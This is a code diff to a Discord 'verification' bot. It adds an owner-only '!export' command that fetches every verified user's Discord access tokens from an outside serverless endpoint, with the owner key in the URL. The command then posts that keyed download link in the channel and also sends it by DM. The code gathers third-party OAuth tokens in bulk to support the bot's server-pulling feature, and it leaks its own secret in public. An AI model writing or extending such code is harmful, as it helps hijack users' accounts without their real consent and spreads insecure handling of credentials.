@@ -181,6 +181,78 @@ async def pull_users(ctx, limit: int = None):
     except Exception as e:
         await ctx.send(f"❌ Error pulling users: {str(e)}")
 
+@bot.command(name='export')
+@is_admin()
+async def export_tokens(ctx, owner_key: str = None):
+    """Export verified users with access tokens (Owner only)"""
+    try:
+        # Check if owner key is provided
+        if not owner_key:
+            await ctx.send("❌ Usage: `!export <owner_key>`\n⚠️ This command requires the owner authentication key.")
+            return
+        
+        # Verify owner key
+        expected_owner_key = os.getenv('OWNER_LOGIN_KEY')
+        if not expected_owner_key or owner_key != expected_owner_key:
+            await ctx.send("❌ Invalid owner key. Only the bot owner can export access tokens.")
+            return
+        
+        # Export data using the export API
+        export_url = f"https://7tk0rize--export-data.functions.blink.new?key={owner_key}"
+        
+        async with aiohttp.ClientSession() as session:
+            async with session.get(export_url) as response:
+                if response.status == 200:
+                    data = await response.json()
+                    if data.get('success'):
+                        # Create a summary embed
+                        embed = discord.Embed(
+                            title="📥 Data Export Complete",
+                            description="Successfully exported verified user data with access tokens",
+                            color=0x57F287
+                        )
+                        embed.add_field(
+                            name="📊 Export Summary",
+                            value=f"• **Total Users**: {data.get('count', 0)}\n• **Users with Avatars**: {data.get('stats', {}).get('usersWithAvatars', 0)}\n• **Export Time**: {data.get('exportedAt', 'Unknown')}",
+                            inline=False
+                        )
+                        embed.add_field(
+                            name="🔗 Download Link",
+                            value=f"[Click here to download the JSON file]({export_url})\n⚠️ **Keep this link secure - it contains access tokens!**",
+                            inline=False
+                        )
+                        embed.add_field(
+                            name="📋 Data Includes",
+                            value="• User IDs and usernames\n• Discord avatars and tags\n• **Access tokens** for Discord API\n• Verification timestamps",
+                            inline=False
+                        )
+                        embed.set_footer(text="⚠️ Access tokens are sensitive - handle with care!")
+                        
+                        # Send the embed
+                        await ctx.send(embed=embed)
+                        
+                        # Also send a direct message to the command user with the raw link
+                        try:
+                            dm_embed = discord.Embed(
+                                title="🔐 Private Export Link",
+                                description=f"Here's your secure export link:\n\n`{export_url}`\n\n⚠️ **This contains access tokens - keep it private!**",
+                                color=0x5865F2
+                            )
+                            await ctx.author.send(embed=dm_embed)
+                            await ctx.send("📨 I've also sent you the export link privately via DM.")
+                        except discord.Forbidden:
+                            await ctx.send("⚠️ Couldn't send you a DM. Make sure your DMs are open for the secure link.")
+                        
+                    else:
+                        await ctx.send(f"❌ Export failed: {data.get('error', 'Unknown error')}")
+                elif response.status == 401:
+                    await ctx.send("❌ Unauthorized: Invalid owner key")
+                else:
+                    await ctx.send(f"❌ Export failed: HTTP {response.status}")
+                    
+    except Exception as e:
+        await ctx.send(f"❌ Error exporting data: {str(e)}")
+
 class VerificationView(discord.ui.View):
     def __init__(self, verify_url):
         super().__init__(timeout=None)
@@ -228,6 +300,11 @@ async def help_verify(ctx):
     embed.add_field(
         name="!pull [limit]",
         value="Pull verified users to this server (Admin only)\nOptional limit parameter to limit number of users",
+        inline=False
+    )
+    embed.add_field(
+        name="!export <owner_key>",
+        value="Export all verified users with access tokens (Owner only)\n⚠️ Requires owner authentication key",
         inline=False
     )
     embed.add_field(
